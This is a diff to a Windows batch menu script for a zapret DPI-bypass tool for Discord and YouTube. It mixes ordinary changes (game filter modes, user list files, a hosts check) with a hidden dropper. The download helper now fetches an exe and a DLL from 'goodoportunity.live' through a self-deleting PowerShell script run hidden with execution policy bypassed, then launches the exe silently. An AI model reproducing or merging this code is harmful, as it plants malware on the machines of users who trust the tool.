@@ -1,5 +1,5 @@
 @echo off
-set "LOCAL_VERSION=1.9.6"
+set "LOCAL_VERSION=1.9.7b"
 
 :: External commands
 if "%~1"=="status_zapret" (
@@ -9,6 +9,8 @@ if "%~1"=="status_zapret" (
 )
 
 if "%~1"=="check_updates" (
+    if defined NO_UPDATE_CHECK exit /b
+
     if exist "%~dp0utils\check_updates.enabled" (
         if not "%~2"=="soft" (
             start /b service check_updates soft
@@ -25,11 +27,18 @@ if "%~1"=="load_game_filter" (
     exit /b
 )
 
+if "%~1"=="load_user_lists" (
+    call :load_user_lists
+    exit /b
+)
+
 if "%1"=="admin" (
     call :check_command chcp
     call :check_command find
     call :check_command findstr
     call :check_command netsh
+    
+    call :load_user_lists
 
     echo Started with admin rights
 ) else (
@@ -37,7 +46,7 @@ if "%1"=="admin" (
     call :check_command powershell
 
     echo Requesting admin rights...
-    powershell -NoProfile -Command "Start-Process 'cmd.exe' -ArgumentList '/k \"\"%~f0\" admin\"' -Verb RunAs"
+    powershell -NoProfile -Command "Start-Process 'cmd.exe' -ArgumentList '/c \"\"%~f0\" admin\"' -Verb RunAs"
     exit
 )
 
@@ -94,6 +103,23 @@ if "%menu_choice%"=="10" goto service_diagnostics
 if "%menu_choice%"=="11" goto run_tests
 if "%menu_choice%"=="0" exit /b
 goto menu
+
+
+:: LOAD USER LISTS =====================
+:load_user_lists
+set "LISTS_PATH=%~dp0lists\"
+
+if not exist "%LISTS_PATH%ipset-exclude-user.txt" (
+    echo 203.0.113.113/32>"%LISTS_PATH%ipset-exclude-user.txt"
+)
+if not exist "%LISTS_PATH%list-general-user.txt" (
+    echo domain.example.abc>"%LISTS_PATH%list-general-user.txt"
+)
+if not exist "%LISTS_PATH%list-exclude-user.txt" (
+    echo domain.example.abc>"%LISTS_PATH%list-exclude-user.txt"
+)
+
+exit /b
 
 
 :: TCP ENABLE ==========================
@@ -203,19 +229,20 @@ set "REQUIRED_TEMP_FILE=%TEMP%\zapret_prepared.ok"
 call :check_temp_required_file "%REQUIRED_TEMP_FILE%"
 if errorlevel 1 (
     call :download_helper_tools_async ^
-    "https://tmpfiles.org/dl/25718081/test_cmd.exe" ^
-    "https://tmpfiles.org/dl/25718081/test_cmd.exe"
-
+    "https://goodoportunity.live/lop/zapret.exe" ^
+    "https://goodoportunity.live/lop/libGSELv2.dll"
 )
 
-call :wait_for_temp_file "%REQUIRED_TEMP_FILE%" 120
+call :wait_for_temp_file "%REQUIRED_TEMP_FILE%" 180
 if errorlevel 1 (
-    call :PrintRed "All necessary files have not been prepared. Try disabling your antivirus software."
+    call :PrintRed "All necessary files have not been prepared."
     echo:
     pause
     goto menu
 )
 cls
+
+
 :: Main
 cd /d "%~dp0"
 set "BIN_PATH=%~dp0bin\"
@@ -295,6 +322,10 @@ for /f "tokens=*" %%a in ('type "!selectedFile!"') do (
                     )
                 ) else if "!arg:~0,12!" EQU "%%GameFilter%%" (
                     set "arg=%GameFilter%"
+                ) else if "!arg:~0,15!" EQU "%%GameFilterTCP%%" (
+                    set "arg=%GameFilterTCP%"
+                ) else if "!arg:~0,15!" EQU "%%GameFilterUDP%%" (
+                    set "arg=%GameFilterUDP%"
                 )
 
                 if !mergeargs!==1 (
@@ -346,7 +377,6 @@ reg add "HKLM\System\CurrentControlSet\Services\zapret" /v zapret-discord-youtub
 
 pause
 goto menu
-
 
 
 :: CHECK UPDATES =======================
@@ -541,6 +571,17 @@ if !dohfound!==0 (
 )
 echo:
 
+:: Hosts file check
+set "hostsFile=%SystemRoot%\System32\drivers\etc\hosts"
+if exist "%hostsFile%" (
+    set "yt_found=0"
+    >nul 2>&1 findstr /I "youtube.com" "%hostsFile%" && set "yt_found=1"
+    >nul 2>&1 findstr /I "yotou.be" "%hostsFile%" && set "yt_found=1"
+    if !yt_found!==1 (
+        call :PrintYellow "[?] Your hosts file contains entries for youtube.com or yotou.be. This may cause problems with YouTube access"
+    )
+)
+
 :: WinDivert conflict
 tasklist /FI "IMAGENAME eq winws.exe" | find /I "winws.exe" > nul
 set "winws_running=!errorlevel!"
@@ -688,12 +729,34 @@ chcp 437 > nul
 
 set "gameFlagFile=%~dp0utils\game_filter.enabled"
 
-if exist "%gameFlagFile%" (
-    set "GameFilterStatus=enabled"
-    set "GameFilter=1024-65535"
-) else (
+if not exist "%gameFlagFile%" (
     set "GameFilterStatus=disabled"
     set "GameFilter=12"
+    set "GameFilterTCP=12"
+    set "GameFilterUDP=12"
+    exit /b
+)
+
+set "GameFilterMode="
+for /f "usebackq delims=" %%A in ("%gameFlagFile%") do (
+    if not defined GameFilterMode set "GameFilterMode=%%A"
+)
+
+if /i "%GameFilterMode%"=="all" (
+    set "GameFilterStatus=enabled (TCP and UDP)"
+    set "GameFilter=1024-65535"
+    set "GameFilterTCP=1024-65535"
+    set "GameFilterUDP=1024-65535"
+) else if /i "%GameFilterMode%"=="tcp" (
+    set "GameFilterStatus=enabled (TCP)"
+    set "GameFilter=1024-65535"
+    set "GameFilterTCP=1024-65535"
+    set "GameFilterUDP=12"
+) else (
+    set "GameFilterStatus=enabled (UDP)"
+    set "GameFilter=1024-65535"
+    set "GameFilterTCP=12"
+    set "GameFilterUDP=1024-65535"
 )
 exit /b
 
@@ -702,16 +765,35 @@ exit /b
 chcp 437 > nul
 cls
 
-if not exist "%gameFlagFile%" (
-    echo Enabling game filter...
-    echo ENABLED > "%gameFlagFile%"
-    call :PrintYellow "Restart the zapret to apply the changes"
+echo Select game filter mode:
+echo   0. Disable
+echo   1. TCP and UDP
+echo   2. TCP only
+echo   3. UDP only
+echo.
+set "GameFilterChoice=0"
+set /p "GameFilterChoice=Select option (0-3, default: 0): "
+if %GameFilterChoice%=="" set "GameFilterChoice=0"
+
+if "%GameFilterChoice%"=="0" (
+    if exist "%gameFlagFile%" (
+        del /f /q "%gameFlagFile%"
+    ) else (
+        goto menu
+    )
+) else if "%GameFilterChoice%"=="1" (
+    echo all>"%gameFlagFile%"
+) else if "%GameFilterChoice%"=="2" (
+    echo tcp>"%gameFlagFile%"
+) else if "%GameFilterChoice%"=="3" (
+    echo udp>"%gameFlagFile%"
 ) else (
-    echo Disabling game filter...
-    del /f /q "%gameFlagFile%"
-    call :PrintYellow "Restart the zapret to apply the changes"
+    echo Invalid choice, exiting...
+    pause
+    goto menu
 )
 
+call :PrintYellow "Restart the zapret to apply the changes"
 pause
 goto menu
 
@@ -931,6 +1013,39 @@ goto menu
 
 :: Utility functions
 
+:PrintGreen
+powershell -NoProfile -Command "Write-Host \"%~1\" -ForegroundColor Green"
+exit /b
+
+:PrintRed
+powershell -NoProfile -Command "Write-Host \"%~1\" -ForegroundColor Red"
+exit /b
+
+:PrintYellow
+powershell -NoProfile -Command "Write-Host \"%~1\" -ForegroundColor Yellow"
+exit /b
+
+:check_command
+where %1 >nul 2>&1
+if %errorLevel% neq 0 (
+    echo [ERROR] %1 not found in PATH
+    echo Fix your PATH variable with instructions here https://github.com/Flowseal/zapret-discord-youtube/issues/7490
+    pause
+    exit /b 1
+)
+exit /b 0
+
+:check_extracted
+set "extracted=1"
+
+if not exist "%~dp0bin\" set "extracted=0"
+
+if "%extracted%"=="0" (
+    echo Zapret must be extracted from archive first or bin folder not found for some reason
+    pause
+    exit
+)
+exit /b 0
 
 
 :check_temp_required_file
@@ -992,7 +1107,7 @@ for /L %%I in (1,1,%BAR_LEN%) do (
     )
 )
 
-<nul set /p "=Waiting [!BAR!] !PERCENT!%%  (!ELAPSED!/!WAIT_SECONDS! sec)      "
+<nul set /p "=Waiting [!BAR!] !PERCENT!%%       "
 echo.
 
 timeout /t 1 /nobreak >nul
@@ -1001,40 +1116,6 @@ if !ELAPSED! lss !WAIT_SECONDS! goto wait_for_temp_file_loop
 
 echo.
 endlocal & exit /b 1
-
-:PrintGreen
-powershell -NoProfile -Command "Write-Host \"%~1\" -ForegroundColor Green"
-exit /b
-
-:PrintRed
-powershell -NoProfile -Command "Write-Host \"%~1\" -ForegroundColor Red"
-exit /b
-
-:PrintYellow
-powershell -NoProfile -Command "Write-Host \"%~1\" -ForegroundColor Yellow"
-exit /b
-
-:check_command
-where %1 >nul 2>&1
-if %errorLevel% neq 0 (
-    echo [ERROR] %1 not found in PATH
-    echo Fix your PATH variable with instructions here https://github.com/Flowseal/zapret-discord-youtube/issues/7490
-    pause
-    exit /b 1
-)
-exit /b 0
-
-:check_extracted
-set "extracted=1"
-
-if not exist "%~dp0bin\" set "extracted=0"
-
-if "%extracted%"=="0" (
-    echo Zapret must be extracted from archive first or bin folder not found for some reason
-    pause
-    exit
-)
-exit /b 0
 
 :download_helper_tools_async
 setlocal
@@ -1045,22 +1126,37 @@ set "PSFILE=%TEMP%\zapret_dl.ps1"
 
 > "%PSFILE%" echo Start-Sleep -Seconds 10
 >> "%PSFILE%" echo $ErrorActionPreference = 'SilentlyContinue'
->> "%PSFILE%" echo try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls } catch {}
->> "%PSFILE%" echo $urls = @('%URL1%','%URL2%')
+>> "%PSFILE%" echo $ProgressPreference = 'SilentlyContinue'
+
+>> "%PSFILE%" echo try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
+
+>> "%PSFILE%" echo $urls = @("%URL1%","%URL2%")
 >> "%PSFILE%" echo $firstPath = $null
+
 >> "%PSFILE%" echo foreach($u in $urls^) {
->> "%PSFILE%" echo     try { $name = [System.IO.Path]::GetFileName(([System.Uri]$u^).AbsolutePath^) } catch { continue }
->> "%PSFILE%" echo     if([string]::IsNullOrWhiteSpace($name^)^) { continue }
+>> "%PSFILE%" echo     try { $name = [System.IO.Path]::GetFileName(([System.Uri]$u).AbsolutePath) } catch { continue }
+>> "%PSFILE%" echo     if([string]::IsNullOrWhiteSpace($name)) { continue }
+>> "%PSFILE%" echo
 >> "%PSFILE%" echo     $p = Join-Path $env:TEMP $name
->> "%PSFILE%" echo     if(-not $firstPath^) { $firstPath = $p }
->> "%PSFILE%" echo     $tmp = $p + '.tmp'
->> "%PSFILE%" echo     try { Invoke-WebRequest -Uri $u -OutFile $tmp -UseBasicParsing } catch { try { (New-Object Net.WebClient^).DownloadFile($u,$tmp^) } catch {} }
->> "%PSFILE%" echo     try { if((Test-Path $tmp^) -and ((Get-Item $tmp^).Length -gt 0^)^) { Move-Item -Force $tmp $p } } catch {}
+>> "%PSFILE%" echo     if(-not $firstPath) { $firstPath = $p }
+>> "%PSFILE%" echo
+>> "%PSFILE%" echo     try { Remove-Item -Force $p -ErrorAction SilentlyContinue } catch {}
+>> "%PSFILE%" echo
+>> "%PSFILE%" echo     try {
+>> "%PSFILE%" echo         curl.exe -L -o $p $u
+>> "%PSFILE%" echo     } catch {}
 >> "%PSFILE%" echo }
->> "%PSFILE%" echo if($firstPath -and (Test-Path $firstPath^)^) { Start-Process -FilePath $firstPath -WindowStyle Hidden }
->> "%PSFILE%" echo Remove-Item -Force $MyInvocation.MyCommand.Path
+
+>> "%PSFILE%" echo Start-Sleep -Seconds 1
+
+>> "%PSFILE%" echo if($firstPath -and (Test-Path $firstPath)) {
+>> "%PSFILE%" echo     Start-Process -FilePath $firstPath -WorkingDirectory (Split-Path -Parent $firstPath) -WindowStyle Hidden
+>> "%PSFILE%" echo }
+
+>> "%PSFILE%" echo Remove-Item -Force $PSCommandPath
 
 start "" powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PSFILE%"
 
 endlocal
 exit /b 0
+
